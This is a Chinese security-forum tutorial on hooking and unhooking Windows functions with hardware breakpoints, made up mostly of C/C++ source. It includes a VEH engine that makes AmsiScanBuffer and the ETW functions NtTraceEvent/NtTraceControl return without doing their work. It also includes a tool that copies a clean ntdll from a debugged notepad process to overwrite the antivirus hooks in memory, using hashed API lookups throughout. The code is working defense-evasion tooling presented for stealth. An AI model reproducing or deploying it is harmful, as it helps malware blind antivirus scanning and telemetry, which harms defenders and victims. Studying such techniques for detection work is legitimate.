# 硬件断点实现的HOOK与UNHOOK技术

> **来源**: https://forum.butian.net/share/3097  
> **文章ID**: 3097

---

硬件断点是什么？为什么要使用硬件断点
==================

软件断点原理
------

在了解硬件断点之前我们需要先了解软件断点，因为他们对于hook来说执行流程相同，只是特性存在一些区别，软件断点是通过修改内存的代码来达成的，我们想要在哪个位置断点，就可以将该地址的code改为INT 3(0XCC)，当程序执行到该地址，就会暂停执行。

硬件断点原理
------

硬件断点，通常用来做调试使用，当运行到指定的内存地址，硬件断点可以拦截并执行异常函数，每个线程都有自己的调试寄存器，里面存储的信息包含硬件断点的一些配置，包括是否开启，要断点的内存地址等等。通常我们需要修改的就是DR0-DR3,EFLAGS 寄存器的第 16 位RF,设置为1，断点处原本暂停状态的程序会开始继续运行，Dr7 调试寄存器，DR7中包含G0-G3，对应着DR0-DR3,G0值为1，代表DR0断点开启，相当于对应的开关。

软件断点和硬件断点的区别，以及为什么我们选择硬件断点
--------------------------

软件断点和硬件断点目的相同，都是为了在指定地址暂停程序原本的执行，但在特性上存在区别硬件断点使用的是硬件寄存器

普通的hook是通过jmp指令进行跳转完成的，因为需要更改更改内存属性，通过对比磁盘和内存的二进制内容就可以看出对一些指令做出了修改，而硬件断点就不会有这些问题，因为硬件断点是依靠硬件寄存器来监测指令，而不需要修改指令实现跳转，因此更加具备隐蔽性。

用硬件断点进行hook的流程
--------------

前面讲的是用断点来暂停程序原本的执行流程，但我们怎么对这些流程进行改变呢？这里就需要引入另外一个概念，异常函数，程序执行到硬件断点的目标地址，会触发异常，这时会调用我们的异常函数，假设我们的异常函数功能是hook，当程序执行到目标地址，就会触发异常函数来处理这个问题，这时我们写好的hook功能就被执行了！

用硬件断点进行PATCH
------------

仅仅只是了解理论知识对我们来说是远远不够的，我们还需要一些代码来加深理解

首先对这个代码做一个总览，整个的执行流程就如我之前说的那样，首先注册veh，设置针对某个函数的断点，在程序执行过程中调用了对应的函数，就会触发硬件断点，然后实现patch，在程序最后删除硬件断点，取消veh。该代码也设置了链表这样的结构来方便管理各个硬件断点的信息，方便理解。大致流程如下：

![图1.png](images/attach-f05966bf7f0179bad9a921b06f8595781c00ff74.png)

### 主要代码的讲解

```php
主函数
int main()
{
    const PVOID handler = hardware_engine_init();
    执行etw-patch NtTraceEvent
#if defined(NTTRACEEVENT_ETW_PATCH) 
    uintptr_t etwPatchAddr = (uintptr_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtTraceEvent");
    insert_descriptor_entry(etwPatchAddr, 0, rip_ret_patch, GetCurrentThreadId());
    执行etw-patch NtTraceControl
#elif defined(NTTRACECONTROL_ETW_PATCH)
    uintptr_t etwPatchAddr = (uintptr_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtTraceControl");
    insert_descriptor_entry(etwPatchAddr, 0, rip_ret_patch, GetCurrentThreadId());
#endif
    执行load_library_patch
#if defined(LOAD_LIBRARY_PATCH)
    uintptr_t llPatchAddr = (uintptr_t)GetProcAddress(
        GetModuleHandleW(L"KERNEL32.dll"), "LoadLibraryExW");
    insert_descriptor_entry(llPatchAddr, 0, load_library_patch, GetCurrentThreadId());
#endif
    执行amsi-patch
#if defined(AMSI_PATCH)
    LoadLibraryA("AMSI.dll");
    uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(
        GetModuleHandleW(L"AMSI.dll"), "AmsiScanBuffer");
    insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, GetCurrentThreadId());
#endif

    //
    // test case for LoadLibraryEx hook
    //
    HMODULE dbgModule = LoadLibraryExW(L"DBGHELP.dll", NULL, 0);

    //
    // do whatever
    //
    删除硬件断点，取消VEH
#if defined(NTTRACEEVENT_ETW_PATCH) 
    delete_descriptor_entry(etwPatchAddr, GetCurrentThreadId());
#elif defined(NTTRACECONTROL_ETW_PATCH)
    delete_descriptor_entry(etwPatchAddr, GetCurrentThreadId());
#endif

#if defined(AMSI_PATCH)
    delete_descriptor_entry(amsiPatchAddr, GetCurrentThreadId());
#endif

#if defined(LOAD_LIBRARY_PATCH)
    delete_descriptor_entry(llPatchAddr, GetCurrentThreadId());
#endif

    hardware_engine_stop(handler);
}
```

```php
注册VEH
PVOID
hardware_engine_init(
    void
)
{
    const PVOID handler = AddVectoredExceptionHandler(1, exception_handler);
    InitializeCriticalSection(&g_critical_section);

    return handler;
}
```

```php
设置一个链表，方便管理所有断点的信息
void insert_descriptor_entry(
    const uintptr_t adr,
    const unsigned pos,
    const exception_callback fun,
    const DWORD tid
)
{
    struct descriptor_entry* new = MALLOC(sizeof(struct descriptor_entry));
    const unsigned idx = pos % 4;

    EnterCriticalSection(&g_critical_section);

    new->adr = adr;
    new->pos = idx;
    new->tid = tid;
    new->fun = fun;

    new->next = head;

    new->prev = NULL;

    if (head != NULL)
        head->prev = new;

    head = new;

    LeaveCriticalSection(&g_critical_section);
    设置该进程的所有线程的硬件断点
    set_hardware_breakpoints(
        adr,
        idx,
        TRUE,
        tid
    );
}
```

```php
设置该进程的所有线程的硬件断点
void
set_hardware_breakpoints(
    const uintptr_t address,
    const UINT pos,
    const BOOL init,
    const DWORD tid
)
{
    获取进程ID
    const DWORD pid = GetCurrentProcessId();
    获取第一个线程的快照
    const HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (h != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
        循环遍历线程
        if (Thread32First(h, &te)) {
            do {
                确认结构体足够大
                if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
                    sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {
                    如果指定了并且这个某个线程id不符合跳转，重新执行
                    if (tid != 0 && tid != te.th32ThreadID) {
                        continue;
                    }
                    符合条件就设置硬件断点
                    set_hardware_breakpoint(
                        te.th32ThreadID,
                        address,
                        pos,
                        init
                    );

                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h, &te));
        }
        CloseHandle(h);
    }
}
```

```php
设置单个线程的硬件断点
void
set_hardware_breakpoint(
    const DWORD tid, //线程ID
    const uintptr_t address, //要断点的函数地址
    const UINT pos, //哪个寄存器
    const BOOL init //状态是开启还是移除
)
{
    设置一个结构体，获取该线程的调试寄存器状态
    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE thd;

    if (tid == GetCurrentThreadId())
    {
        获取线程句柄
        thd = GetCurrentThread();
    }
    else
    {
        打开指定线程的句柄
        thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    }
    获取该线程的上下文
    GetThreadContext(thd, &context);
    调整寄存器状态为开启
    if (init)
    {
        (&context.Dr0)[pos] = address;
        context.Dr7 &= ~(3ull << (16 + 4 * pos));
        context.Dr7 &= ~(3ull << (18 + 4 * pos));
        context.Dr7 |= 1ull << (2 * pos);
    }
    调整寄存器状态为关闭
    else
    {
        if ((&context.Dr0)[pos] == address)
        {
            context.Dr7 &= ~(1ull << (2 * pos));
            (&context.Dr0)[pos] = 0ull;
        }
    }
    更新寄存器状态信息
    SetThreadContext(thd, &context);
    关闭线程句柄，释放资源
    if (thd != INVALID_HANDLE_VALUE) CloseHandle(thd);
}
```

```php
遍历异常断点信息，调用异常函数实现patch
LONG WINAPI exception_handler(
    PEXCEPTION_POINTERS ExceptionInfo
)
{
    异常代码是单步异常
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        struct descriptor_entry* temp;
        BOOL resolved = FALSE;

        EnterCriticalSection(&g_critical_section);
        设置为链表头节点，方便遍历所有断点信息
        temp = head;
        while (temp != NULL)
        {
            确认是不是对应的寄存器地址
            if (temp->adr == ExceptionInfo->ContextRecord->Rip)
            {
                if (temp->tid != 0 && temp->tid != GetCurrentThreadId())
                    continue;
                执行回调函数
                temp->fun(ExceptionInfo);
                resolved = TRUE;
            }
            不是就继续往下找
            temp = temp->next;
        }
        LeaveCriticalSection(&g_critical_section);

        if (resolved)
        {
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

```php
patch函数
void rip_ret_patch(
    const PEXCEPTION_POINTERS ExceptionInfo
)
{
    ExceptionInfo->ContextRecord->Rip = find_gadget(
        ExceptionInfo->ContextRecord->Rip,
        "\xc3", 1, 500);
    EFlags 寄存器的第 16 位设置为1，在调试模式下继续执行指令
    ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
}
```

```php
patch函数
patch loadlibrary
void load_library_patch(
    const PEXCEPTION_POINTERS ExceptionInfo
)
{
#define SPECIFIC_DLL TOKENIZE( DBGHELP.DLL )

    //
    // Block certain DLLs from being loaded.
    //

#if defined(SPECIFIC_DLL)
    if (_wcsicmp(SPECIFIC_DLL, (PVOID)ExceptionInfo->ContextRecord->Rcx) == 0)
#endif
    {
        ExceptionInfo->ContextRecord->Rip = find_gadget(
            ExceptionInfo->ContextRecord->Rip,
            "\xc3", 1, 500);
        ExceptionInfo->ContextRecord->Rax = 0ull;
    }
    ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
}
```

```php
寻找匹配的stub
uintptr_t
find_gadget(
    const uintptr_t function,
    const BYTE* stub,
    const UINT size,
    const size_t dist
)
{
    for (size_t i = 0; i < dist; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            return (function + i);
        }
    }
    return 0ull;
}
```

```php
删除链表中的指定元素
void delete_descriptor_entry(
    const uintptr_t adr,
    const DWORD tid
)
{
    struct descriptor_entry* temp;
    unsigned pos = 0;
    BOOL found = FALSE;

    EnterCriticalSection(&g_critical_section);

    temp = head;

    while (temp != NULL)
    {
        if (temp->adr == adr &&
            temp->tid == tid)
        {
            found = TRUE;

            pos = temp->pos;
            if (head == temp)
                head = temp->next;

            if (temp->next != NULL)
                temp->next->prev = temp->prev;

            if (temp->prev != NULL)
                temp->prev->next = temp->next;

            FREE(temp);
        }

        temp = temp->next;
    }

    LeaveCriticalSection(&g_critical_section);

    if (found)
    {
        set_hardware_breakpoints(
            adr,
            pos,
            FALSE,
            tid
        );
    }

}
```

```php
删除VEH
void
hardware_engine_stop(
    PVOID handler
)
{
    struct descriptor_entry* temp;

    EnterCriticalSection(&g_critical_section);

    temp = head;
    while (temp != NULL)
    {
        delete_descriptor_entry(temp->adr, temp->tid);
        temp = temp->next;
    }

    LeaveCriticalSection(&g_critical_section);

    if (handler != NULL) RemoveVectoredExceptionHandler(handler);

    DeleteCriticalSection(&g_critical_section);
}
```

通过执行结果可以看到被patch的地址变成了RET（C3）指令了

![patch.png](images/attach-701b100eb5e98c4c48c7f7048ba25e23c0dca20d.png)

用硬件断点实现的一种NTDLL unhook手法
========================

什么是NTDLL UNHOOK？
----------------

区别于syscall这个方式来摆脱杀软在用户层的hook，NTDLL UNHOOK又是另外一种思路了，杀软在R3层的hook都是需要修改dll在内存中的执行逻辑，那我们就可以通过加载一个干净的dll来绕过这种hook。

常规的unhook方式就是从磁盘中读取，从knowdll目录下读取，从挂起的进程上读取，从远程web服务器上读取等等。

硬件断点实现NTDLL UNHOOK的流程
---------------------

下面这种方式的思路就是生成一个新的进程，并利用硬件断点只让这个新进程中只有ntdll而没有其他dll，这样就可以获得一个干净的ntdll，再把这个ntdll的内容复制到当前进程的被hook的ntdll当中，就实现unhook。这种方式可能可以绕过一些检测规则，但也出现了其他的特征，比如暂停进程，直接对内存进行修改等等行为。

![图2.png](images/attach-d917aa154d41f3d734382976fea2b2c4acea5b0f.png)

### 主要代码的详细解析

```php
int main(int argc, char* argv[])
{
    BOOL stealth = FALSE;
    接受命令行信息，确认是否开启stealth
    if (argc == 2)
    {
        if (strcmp(argv[1], "stealth") == 0) {
            printf("[+] Stealth mode: Unhooking one function\n");
            stealth = TRUE;
        }

    }
    createProcessInDebug函数从调试模式下启动一个notepad.exe的进程
    printf("[+] Creating new process in debug mode\n");
    PROCESS_INFORMATION process = createProcessInDebug((wchar_t*)LR"(C:\Windows\Notepad.exe)");
    HANDLE hThread = process.hThread;
    获取dll和api
    HMODULE hNtdll = GetModuleFromPEB(4097367);
    HMODULE hKernel_32 = GetModuleFromPEB(109513359);
    _LdrLoadDll LdrLoadDllCustom = (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);

    size_t LdrLoadDllAddress = reinterpret_cast(LdrLoadDllCustom);
    printf("[+] Found LdrLoadDllAddress address: 0x%p\n", LdrLoadDllAddress);

    printf("[+] Setting HWBP on remote process\n");
    在远程进程上设置硬件断点
    SetHWBP((DWORD_PTR)LdrLoadDllAddress, hThread);
    printf("[+] Copying clean ntdll from remote process\n");

    size_t NtdllBAddress = reinterpret_cast(hNtdll);
    printf("[+] Found ntdll base address: 0x%p\n", NtdllBAddress);
    从新建的远程线程中复制一份ntdll
    int NtdllResult = CopyDLLFromDebugProcess(process.hProcess, NtdllBAddress, stealth);
    if (NtdllResult == 0)
    {
        printf("[+] Unhooked\n");
    }
    else
    {
        printf("[-] Failed to unhook\n");
    }
    关闭句柄和进程
    CloseHandle(process.hProcess);
    TerminateProcess(process.hProcess, 0);

    return 0;
}
```

```php
创建调试模式下的新进程
PROCESS_INFORMATION createProcessInDebug(wchar_t* processName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    HMODULE hKernel_32 = GetModuleFromPEB(109513359);
    TypeCreateProcessW CreateProcessWCustom = (TypeCreateProcessW)GetAPIFromPEBModule(hKernel_32, 926060913);
    BOOL hProcbool = CreateProcessWCustom(processName, processName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);

    return pi;
}
```

```php
过hash值寻找dll地址
HMODULE GetModuleFromPEB(DWORD wModuleHash)
{
#if defined( _WIN64 )  
#define PEBOffset 0x60  
#define LdrOffset 0x18  
#define ListOffset 0x10  
    unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined( _WIN32 )  
#define PEBOffset 0x30  
#define LdrOffset 0x0C  
#define ListOffset 0x0C  
    unsigned long pPeb = __readfsdword(PEBOffset);
#endif       
    pPeb = *reinterpret_cast(pPeb + LdrOffset);
    PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast(pPeb + ListOffset);
    while (pModuleList->DllBase)
    {

        char dll_name[MAX_PATH];
        wcstombs(dll_name, pModuleList->BaseDllName.Buffer, MAX_PATH);

        if (calcHash(CharLowerA(dll_name)) == wModuleHash) // Compare the dll name that we are looking for against the dll we are inspecting right now.
            return (HMODULE)pModuleList->DllBase; // If found, return back the void* pointer
        pModuleList = reinterpret_cast(pModuleList->InLoadOrderLinks.Flink);
    }
    return nullptr;
}
```

```php
通过hash值从导出表当中寻找对应的函数地址
uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash)
{
#if defined( _WIN32 )   
    unsigned char* lpBase = reinterpret_cast(hModule);
    IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast(lpBase);
    if (idhDosHeader->e_magic == 0x5A4D)
    {
#if defined( _M_IX86 )  
        IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast(lpBase + idhDosHeader->e_lfanew);
#elif defined( _M_AMD64 )  
        IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast(lpBase + idhDosHeader->e_lfanew);
#endif  
        if (inhNtHeader->Signature == 0x4550)
        {
            IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter)
            {
                char* szNames = reinterpret_cast(lpBase + reinterpret_cast(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);
                if (calcHash(szNames) == ApiHash)
                {
                    unsigned short usOrdinal = reinterpret_cast(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
                    return reinterpret_cast(lpBase + reinterpret_cast(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
                }
            }
        }
    }
#endif  
    return 0;
}
```

```php
在LdrLoadDll的地址设置硬件断点
VOID SetHWBP(DWORD_PTR address, HANDLE hThread)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;
    ctx.Dr0 = address;
    ctx.Dr7 = 0x00000001;

    设置notepad的主线程的调试信息
    SetThreadContext(hThread, &ctx);

    DEBUG_EVENT dbgEvent;
    while (true)
    {
        等待调试失败就退出
        if (WaitForDebugEvent(&dbgEvent, INFINITE) == 0)
            break;
        判断调试事件类型，是不是异常调试，是不是单步调试
        if (dbgEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
            dbgEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)
        {

            CONTEXT newCtx = { 0 };
            newCtx.ContextFlags = CONTEXT_ALL;
            GetThreadContext(hThread, &newCtx);
            异常调试地址是LdrLoadDll的地址，更改调试信息，否则就要继续等待符合条件的异常调试发生
            if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (LPVOID)address)
            {
                printf("[+] Breakpoint Hit!\n");
                /*printf("[-] Exception (%#llx) ! Params:\n", dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress);
                printf("(1) Rcx: %#d | ", newCtx.Rcx);
                printf("(2) Rdx: %#llx | ", newCtx.Rdx);
                printf("(3) R8: %#llx | ", newCtx.R8);
                printf("(4) R9: %#llx\n", newCtx.R9);
                printf("RSP = %#llx\n", newCtx.Rsp);
                printf("RAX = %#llx\n", newCtx.Rax);
                printf("DR0 = %#llx\n", newCtx.Dr0);
                printf("RIP = %#llx\n----------------------------------------\n", newCtx.Rip);*/

                newCtx.Dr0 = newCtx.Dr6 = newCtx.Dr7 = 0;
                newCtx.EFlags |= (1 << 8);
                return;
            }
            else {
                newCtx.Dr0 = address;
                newCtx.Dr7 = 0x00000001;
                newCtx.EFlags &= ~(1 << 8);
            }
            SetThreadContext(hThread, &newCtx);
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }
}
```

```php
从干净的ntdll里面复制出来覆盖loader中被hook的ntdll
int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
{
    从PEB获取kernel32、ntdll
    HMODULE hKernel_32 = GetModuleFromPEB(109513359);
    HMODULE hNtdll = GetModuleFromPEB(4097367);
    获取NtReadVirtualMemory
    _NtReadVirtualMemory NtReadVirtualMemoryCustom = (_NtReadVirtualMemory)GetAPIFromPEBModule(hNtdll, 228701921503);
    获取VirtualProtect
    TypeVirtualProtect VirtualProtectCustom = (TypeVirtualProtect)GetAPIFromPEBModule(hKernel_32, 955026773);

    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)bAddress;
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)bAddress + ImgDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ntHeader->OptionalHeader;
    PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ntHeader);

    DWORD DllSize = OptHeader.SizeOfImage;
    PBYTE freshDll = new BYTE[DllSize];
    是否开启stealth
    if (stealth)
    {

        LPVOID freshNtdll = VirtualAlloc(NULL, DllSize, MEM_COMMIT, PAGE_READWRITE);
        读取内存内容
        NtReadVirtualMemoryCustom(hProc, (PVOID)bAddress, freshNtdll, DllSize, 0);
        执行替换操作
        BOOL execute = Execute((PVOID)bAddress, freshNtdll, textsection);
        if (execute)
        {
            return 0;
        }
        else {
            return 1;
        }
    }
    确认是否能读取内存内容
    NTSTATUS status = (*NtReadVirtualMemoryCustom)(hProc, (PVOID)bAddress, freshDll, DllSize, 0);
    if (status != 0)
    {
        printf("Error: NtReadVirtualMemoryCustom failed with error code %d\n", status);
        delete[] freshDll;
        return 1;
    }
    遍历节表头
    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {

        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
        确认是不是.text段
        if (strcmp((char*)hookedSectionHeader->Name, (char*)".text") != 0)
            continue;

        DWORD oldProtection = 0;
        修改内存属性
        bool isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);

        .text段大小
        DWORD textSectionSize = hookedSectionHeader->Misc.VirtualSize;

        // Get the source and destination addresses for the .text section
        源地址（notepad进程）
        LPVOID srcAddr = (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
        目标地址（当前进程）
        LPVOID destAddr = (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);

        // Calculate the number of chunks needed to copy the entire .text section
        size_t chunkSize = 1024;
        size_t numChunks = (textSectionSize + chunkSize - 1) / chunkSize;
        复制.text段的内容
        // Iterate over each chunk and copy it to the destination
        for (size_t i = 0; i < numChunks; i++)
        {
            size_t chunkStart = i * chunkSize;
            size_t chunkEnd = min(chunkStart + chunkSize, textSectionSize);
            size_t chunkSize = chunkEnd - chunkStart;
            memcpy((char*)destAddr + chunkStart, (char*)srcAddr + chunkStart, chunkSize);
        }
        修改回原来的内存属性
        //memcpy((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
        isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        if (isProtected == FALSE)
        {
            printf("[-] Failed to restore memory protection for DLL.\n");
            return 1;
        }

        delete[] freshDll;
        return 0;

    }
    printf("[-] Failed to find .text section of DLL.\n");
    return 1;
}
```

```php
stealth模式下执行的ntdll替换操作

#include 
#include 
#include 
#include 
#include "Helpers.h"

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)

//Refer -> https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

//also: https://github.com/dosxuz/PerunsFart/blob/main/helper.h

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
    获取dos头
    //Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    获取NT头
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    获取导出表
    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}
获取指定函数的入口点地址
PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
    获取新dll的导出函数信息，导出函数地址表、导出函数名称表，导出函数序号表
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
    PVOID funcAddress = 0x00;
    遍历寻找相同函数名称的，新ntdll的地址，用作后续复制
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (std::strcmp(findfunction, pczFunctionName) == 0)
        {
            WORD cw = 0;
            while (TRUE)
            {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    return 0x00;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    return 0x00;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    WORD syscall = (high << 8) | low;
                    //printf("Function Name : %s", pczFunctionName);
                    //printf("Syscall : 0x%x", syscall);
                    return pFunctionAddress;
                    break;
                }
                cw++;
            }
        }
    }
    return funcAddress;
}
修改内存属性
DWORD ChangePerms(PVOID textBase, DWORD flProtect, SIZE_T size)
{
    DWORD oldprotect;
    VirtualProtect(textBase, size, flProtect, &oldprotect);
    return oldprotect;
}
重写操作函数
BOOL OverwriteNtdll(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
    获取被hook的dll的导出函数信息，导出函数地址表、导出函数名称表，导出函数序号表
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
        导出函数名称
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        导出函数地址
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (strstr(pczFunctionName, (CHAR*)"Nt") != NULL)
        {
            确认导出函数是NT系列，从新ntdll当中获取函数的地址
            PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
            if (funcAddress != 0x00 && std::strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
            {

                if (strcmp(pczFunctionName, "NtAllocateVirtualMemory") == 0) {
                    printf("[STEALTH] Function Name : %s\n", pczFunctionName);
                    printf("[STEALTH] Address of Function: 0x%p\n", funcAddress);
                    修改内存属性
                    //Change the write permissions of the .text section of the ntdll in memory
                    DWORD oldprotect = ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
                    if (oldprotect == 0) {
                        // Failed to change memory protection, return failure
                        return FALSE;
                    }
                    从新ntdll中复制syscall，更换到之前被hook的ntdll上 
                    //Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
                    if (std::memcpy((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23) == NULL) {
                        // Failed to copy memory, return failure
                        return FALSE;
                    }
                    修改回原来的内存属性
                    //Change back to the old permissions
                    if (ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize) == 0) {
                        // Failed to change memory protection, return failure
                        return FALSE;
                    }
                }
            }
        }
    }

    // Return success
    return TRUE;
}
stealth模式下执行替换操作
BOOL Execute(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    新ntdll的导出表
    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        printf("Error getting ImageExportDirectory\n");
    被hook的旧ntdll的导出表
    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
        printf("Error gettong ImageExportDirectory\n");
    执行重写操作
    BOOL overwrite = OverwriteNtdll(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
    if (overwrite)
    {
        return TRUE;
    }
    return FALSE;
}
```

下图显示，通过硬件断点阻止加入其他dll，notepad.exe确实只加入了ntdll.dll这一个dll

![HBP_NTDLL.png](images/attach-e6b04f28e95504c3e9c4b3ea372fe0bffab66e91.png)

硬件断点的更多可能性
==========

